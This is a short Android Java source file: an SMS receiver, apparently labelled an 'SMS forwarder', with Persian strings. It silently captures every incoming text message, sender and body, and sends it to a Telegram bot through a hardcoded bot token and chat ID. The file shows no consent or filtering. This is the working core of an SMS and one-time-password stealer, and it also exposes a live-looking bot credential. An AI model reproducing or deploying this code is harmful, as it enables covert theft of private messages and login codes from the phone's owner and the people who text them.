package com.example.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SMSReceiver extends BroadcastReceiver {

    private static final String BOT_TOKEN = "8393691423:AAGeEYQfHlv4U0Al4_WcdobYP_SdyRjL_28";
    private static final String CHAT_ID = "7398336950";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String message = sms.getDisplayMessageBody();
                    sendToTelegram("📩 SMS از: " + sender + "\n📝 متن: " + message);
                }
            }
        }
    }

    private void sendToTelegram(String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
                    + "?chat_id=" + CHAT_ID
                    + "&text=" + URLEncoder.encode(message, "UTF-8");
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.connect();
            conn.getInputStream();
        } catch (Exception e) {
            Log.e("SMSForwarder", "خطا در ارسال تلگرام", e);
        }
    }
}
